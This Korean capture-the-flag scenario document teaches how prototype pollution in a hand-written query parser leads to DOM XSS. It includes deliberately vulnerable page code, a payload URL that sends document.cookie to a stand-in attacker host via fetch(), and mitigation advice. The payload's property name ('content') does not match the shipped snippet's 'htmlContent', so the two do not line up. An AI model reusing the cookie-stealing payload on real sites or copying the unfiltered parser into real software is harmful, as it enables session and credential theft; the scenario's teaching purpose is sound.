---
title: Client-Side Prototype Pollution to DOM XSS — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, prototype-pollution, client-side, dom-xss, javascript, gadget-abuse]
confidence: high
---

# Client-Side Prototype Pollution to DOM XSS — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Modern Dashboard Lite (모던 대시보드 라이트)
- **난이도**: High
- **핵심 컨셉**: 브라우저의 런타임 자바스크립트 실행 환경에서 발생하는 **클라이언트 사이드 프로토타입 오염(Client-Side Prototype Pollution)** 취약점을 악용하여 **DOM XSS**를 실행하는 실전 고급 시나리오 문제입니다. 대상 애플리케이션은 URL 쿼리 파라미터나 해시(#)로 전달받은 복잡한 키-값 구조의 설정 문자열을 동적으로 객체화하는 자바스크립트 파싱 코드를 내장하고 있습니다. 공격자는 이 파싱 알고리즘의 결함을 공략해 클라이언트단 글로벌 `Object.prototype`을 오염시킵니다. 이후, 대시보드 내 특정 UI 구성 요소나 광고 위젯 렌더링 스크립트가 정의되지 않은 옵션 필드를 상속받아 HTML 영역에 동적으로 렌더링하는 가젯(Gadget) 오작동을 노려 악성 스크립트를 인젝션시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend SPA (Vanilla JS / jQuery-like Custom Lib)**:
  - 사용자가 페이지 접속 시 URL 파라미터(예: `index.html?config[theme]=dark`)를 파싱하여 환경 설정을 구성해 주는 클라이언트 코드 제공.
- **Flag 위치**:
  - 피해자(Admin Bot)의 쿠키(`document.cookie`) 영역에 플래그가 들어있어 XSS 실행을 통해 가로채야 합니다.

### 2.2 취약점 지점
1. **Vulnerable Query String Parser**:
   - 객체 속성을 브래킷 표기법(Bracket Notation)으로 파싱할 때, `__proto__` 지시어를 체크하지 않고 프로토타입 레벨에 값을 즉시 매핑합니다.
   - 예: `?__proto__[sourceURL]=javascript:alert(1)` 또는 `?__proto__[onload]=fetch(...)`
2. **DOM Sink Gadget**:
   - 대시보드 내 광고 배너나 알림 팝업 창 빌드 스크립트가 로컬 `options` 객체를 생성하면서, `sourceURL` 속성이 없으면 `Object.prototype.sourceURL`을 동적으로 참조해 가져오고, 이를 이스케이프 처리 없이 `script.src`나 `iframe.src` 혹은 `innerHTML` 지점에 삽입(Sink)합니다.

---

## 3. 공격 면 (Attack Surface)

| 파라미터 유입점 | 가용 프로토콜 | 공격 목표 | 취약 함수/지점 |
|-----------------|---------------|-----------|----------------|
| `window.location.search` / `hash` | `__proto__` / `constructor` | 클라이언트 Object 프로토타입 속성 강제 주입 | `innerHTML` / `element.src` 할당 스크립트 가젯 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 클라이언트 쿼리 파서 분석
공격자는 브라우저에 로드된 `app.js` 코드를 정밀 디버깅하여 URL의 파라미터가 맵으로 변화되는 로직을 살핍니다.
- **코드 양상**:
  ```javascript
  function parseParams(query) {
      let params = {};
      query.split('&').forEach(pair => {
          let [key, val] = pair.split('=');
          // 복잡한 브래킷 속성 매핑 로직 중 __proto__ 검증 누락
          setNestedProperty(params, key, decodeURIComponent(val));
      });
      return params;
  }
  ```
- 콘솔에 `Object.prototype.polluted = "yes"`를 확인하여, URL에 `?__proto__[polluted]=yes`를 입력하면 모든 빈 객체가 `polluted` 속성을 기본적으로 가지게 됨을 테스트합니다.

### Step 2. DOM Sink 및 가젯(Gadget) 발굴
글로벌 프로토타입 오염을 XSS로 연계하기 위해, 소스코드 내에서 안전하지 않게 쓰이는 빈 속성을 상속받는 DOM 조작 가젯을 탐색합니다.
- **가젯 분석**:
  ```javascript
  let widget = config.widget || {};
  let template = document.createElement('div');
  // widget.content가 설정되지 않은 경우, Object.prototype.content 값을 그대로 활용함!
  template.innerHTML = widget.content || "<p>Default Content</p>"; 
  document.body.appendChild(template);
  ```
- 만약 `Object.prototype.content`에 악성 HTML 스크립트를 주입해 둔다면, `widget.content`가 비어있을 때 해당 스크립트가 그대로 `innerHTML`에 대입되어 발화함을 인지합니다.

### Step 3. 익스플로잇 페이로드 작성
1. 프로토타입 오염과 HTML injection 가젯을 연동한 악성 링크를 설계합니다.
   - **페이로드 구조**:
     `http://target.challenge.local/index.html?__proto__[content]=<img src=x onerror=fetch('http://attacker.local/log?c='%2Bdocument.cookie)>`
2. 브라우저가 위 URL을 실행하면:
   1. `parseParams` 함수가 돌면서 `Object.prototype.content`에 `<img src=x onerror=...>` 문자열을 인젝션합니다.
   2. 위젯 렌더링 로직이 실행되면서 비어있는 `widget.content` 대안으로 오염된 프로토타입 속성을 가져와 `innerHTML`에 할당합니다.
   3. 이미지 로드 에러가 즉시 발생하며 XSS 스크립트가 실행됩니다.

### Step 4. flag 획득
1. 조작된 링크를 피해자 봇에게 송부합니다.
2. 봇이 해당 링크를 오픈하여 렌더링되면 DOM XSS가 동작해 쿠키에 있는 플래그 정보가 유출됩니다.
3. 공격자는 수신한 데이터 로그에서 플래그(`FLAG{client_side_prototype_pollution_to_dom_xss_gadget_hijack}`)를 획득합니다.

---

## 5. 취약점 유발 프론트엔드 코드 스니펫

```html
<!-- index.html (취약한 클라이언트 사이드 설정 파서 예시) -->
<!DOCTYPE html>
<html>
<head>
    <title>Modern Dashboard Lite</title>
</head>
<body>
    <h1>사용자 통계 대시보드</h1>
    <div id="widget-container"></div>

    <script>
        // 취약점 지점 1: 재귀적으로 오브젝트 경로를 생성할 때 __proto__ 키를 여과하지 않음
        function setProperty(obj, path, value) {
            const parts = path.replace(/\]/g, '').split('[');
            let current = obj;
            for (let i = 0; i < parts.length - 1; i++) {
                const part = parts[i];
                if (!current[part]) {
                    current[part] = {};
                }
                current = current[part]; // 만약 part가 __proto__라면 Object.prototype에 접근됨
            }
            current[parts[parts.length - 1]] = value;
        }

        function loadConfig() {
            const search = window.location.search.substring(1);
            const config = {};
            if (search) {
                search.split('&').forEach(pair => {
                    const [k, v] = pair.split('=');
                    setProperty(config, k, decodeURIComponent(v));
                });
            }
            return config;
        }

        const userConfig = loadConfig();

        // 취약점 지점 2: DOM Sink 가젯
        // userConfig.widget 객체 혹은 하위 속성이 정의되어 있지 않아 
        // 오염된 Object.prototype.htmlContent 속성을 그대로 상속받아 이스케이프 없이 삽입
        const widgetOptions = userConfig.widget || {};
        const container = document.getElementById('widget-container');
        
        if (widgetOptions.htmlContent) {
            // XSS 트리거 지점
            container.innerHTML = widgetOptions.htmlContent; 
        } else {
            container.innerHTML = "<p>기본 위젯 데이터 로딩 완료.</p>";
        }
    </script>
</body>
</html>
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **프로토타입 차단 필터 수립 (Prevent Prototype Mutation)**:
   - 클라이언트 쿼리 파서 코드가 입력 속성명을 재귀 해석할 때, 민감 문자열(`__proto__`, `constructor`, `prototype`)을 강력한 블랙리스트 패턴으로 검사하여 연산을 즉각 스킵하도록 규정합니다.
     ```javascript
     if (part === '__proto__' || part === 'constructor' || part === 'prototype') {
         continue;
     }
     ```
2. **Object.create(null) 기반 사전 정의 객체 구성**:
   - 구성 옵션 컨테이너 객체를 선언할 때 프로토타입 체인이 결여된 무(Null) 오리진 객체를 생성하여 상속에 따른 부수 작용을 원천 배제합니다.
     ```javascript
     const config = Object.create(null);
     ```
3. **안전한 DOM 업데이트 API 사용**:
   - `innerHTML` 대신 HTML 인코딩을 기본 내장하는 `textContent` 또는 `innerText` 지시어를 사용하여 스크립트 구문이 브라우저 파서에 의해 기동되는 현상을 막아냅니다.
4. **스키마 및 라이브러리 검증 수립**:
   - 직접 작성한 쿼리 파서 코드 대신 정제된 쿼리 스트링 라이브러리(최신 버전의 `qs` 패키지 등)를 사용합니다.
